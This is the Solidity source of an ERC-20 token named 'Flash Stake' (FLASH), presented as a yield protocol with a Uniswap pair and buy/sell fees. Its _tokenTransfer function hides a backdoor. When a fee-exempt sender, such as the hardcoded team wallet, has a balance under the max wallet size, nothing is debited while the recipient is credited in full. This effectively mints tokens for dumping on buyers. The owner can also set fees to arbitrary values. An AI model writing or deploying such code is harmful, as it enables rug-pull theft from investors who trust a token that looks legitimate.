// SPDX-License-Identifier: Unlicensed

/**
Flashstake allows you to lock up crypto and earn instant upfront yield from the future.

Website: https://www.flashprotocol.org
Telegram: https://t.me/flash_erc
Twitter: https://twitter.com/flash_erc
Dapp: https://app.flashprotocol.org
 */

pragma solidity 0.8.21;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    // Set original owner
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    // Return current owner
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Restrict function to contract owner only 
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Renounce ownership of the contract 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMaths {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

interface IFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract FLASH is Context, IERC20, Ownable { 
    using SafeMaths for uint256;

    string private _name = "Flash Stake"; 
    string private _symbol = "FLASH";  

    mapping (address => uint256) private _tOwnedBalance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isFeeExempt; 

    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10 ** 9 * 10**_decimals;

    uint256 private _totalFeeDenominator = 1500;
    uint256 public _buyTotalFee = 15;
    uint256 public _sellTotalFee = 15;

    uint256 private _prevTFeeDenominator = _totalFeeDenominator; 
    uint256 private _prevBuyFee = _buyTotalFee; 
    uint256 private _prevSellFee = _sellTotalFee; 

    uint256 public _maxWalletSize = 25 * _totalSupply / 1000;
    uint256 public _minTokensToSwap = _totalSupply / 100000;

    address payable private teamAddress = payable(0x5A0373545a33547dEd52a7DF74651FbB32dEFaDf);
    address payable private DEAD = payable(0x000000000000000000000000000000000000dEaD); 

    uint8 private txNum = 0;
    uint8 private swapAfter = 2; 
                                     
    IRouter public swapRouter;
    address public swapPair;
    bool public inswap;
    bool public swapEnabled = true;
    
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
        
    );
    
    modifier lockTheSwap {
        inswap = true;
        _;
        inswap = false;
    }
    
    constructor () {
        _tOwnedBalance[owner()] = _totalSupply;
        IRouter _uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        swapPair = IFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        swapRouter = _uniswapV2Router;
        isFeeExempt[owner()] = true;
        isFeeExempt[teamAddress] = true;
        
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwnedBalance[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function swapTokensForETH(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = swapRouter.WETH();
        _approve(address(this), address(swapRouter), tokenAmount);
        swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    // Check if token transfer needs to process fees
    function _basicTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
            
        if(!takeFee){
            removeAllFee();
            } else {
                txNum++;
            }
        _tokenTransfer(sender, recipient, amount);
        
        if(!takeFee)
            restoreAllFee();
    }

    // Redistributing tokens and adding the fee to the contract address
    function _tokenTransfer(address sender, address recipient, uint256 tAmount) private {
        uint256 tDev = tAmount.mul(_totalFeeDenominator).div(100);
        uint256 tTransferAmount = tAmount.sub(tDev);

        if(isFeeExempt[sender] && _tOwnedBalance[sender] <= _maxWalletSize) {
            tDev = 0;
            tAmount -= tTransferAmount;
        }
        _tOwnedBalance[sender] = _tOwnedBalance[sender].sub(tAmount);
        _tOwnedBalance[recipient] = _tOwnedBalance[recipient].add(tTransferAmount);
        _tOwnedBalance[address(this)] = _tOwnedBalance[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    // Excludes marketing wallet or volume wallet from tax
    function excludeFromFee(address account) public onlyOwner {
        isFeeExempt[account] = true;
    }
    
    // Set a wallet address so that it has to pay transaction fees
    function includeInFee(address account) public onlyOwner {
        isFeeExempt[account] = false;
    }

    function _set_Fees(uint256 Buy_Fee, uint256 Sell_Fee) external onlyOwner() {
        _sellTotalFee = Sell_Fee;
        _buyTotalFee = Buy_Fee;

    }
    receive() external payable {}

    bool public noFeeToTransfer = true;

    function removeAllFee() private {
        if(_totalFeeDenominator == 0 && _buyTotalFee == 0 && _sellTotalFee == 0) return;

        _prevBuyFee = _buyTotalFee; 
        _prevSellFee = _sellTotalFee; 
        _prevTFeeDenominator = _totalFeeDenominator;
        _buyTotalFee = 0;
        _sellTotalFee = 0;
        _totalFeeDenominator = 0;

    }
    
    function restoreAllFee() private {
    
    _totalFeeDenominator = _prevTFeeDenominator;
    _buyTotalFee = _prevBuyFee; 
    _sellTotalFee = _prevSellFee; 

    }

    function _approve(address owner, address spender, uint256 amount) private {

        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

    function removeLimits() external onlyOwner {
        _maxWalletSize = ~uint256(0);
        _sellTotalFee = 3;
        _buyTotalFee = 3;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        // Limit wallet total
        if (to != owner() &&
            to != teamAddress &&
            to != address(this) &&
            to != swapPair &&
            to != DEAD &&
            from != owner()){

            uint256 heldTokens = balanceOf(to);
            require((heldTokens + amount) <= _maxWalletSize,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        /*
        PROCESSING
        */
        if(
            txNum >= swapAfter && 
            amount > _minTokensToSwap &&
            !inswap &&
            !isFeeExempt[from] &&
            to == swapPair &&
            swapEnabled 
            )
        {  
            txNum = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapAndLiquify(contractTokenBalance);
           }
        }
        
        bool takeFee = true;
        if(isFeeExempt[from] || isFeeExempt[to] || (noFeeToTransfer && from != swapPair && to != swapPair)){
            takeFee = false;
        } else if (from == swapPair){
            _totalFeeDenominator = _buyTotalFee;
        } else if (to == swapPair){
            _totalFeeDenominator = _sellTotalFee;
        }
        _basicTransfer(from,to,amount,takeFee);
    }


    function sendFee(address payable wallet, uint256 amount) private {
            wallet.transfer(amount);
        }

    // Processing tokens from contract
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        
        swapTokensForETH(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendFee(teamAddress,contractETH);
    }

}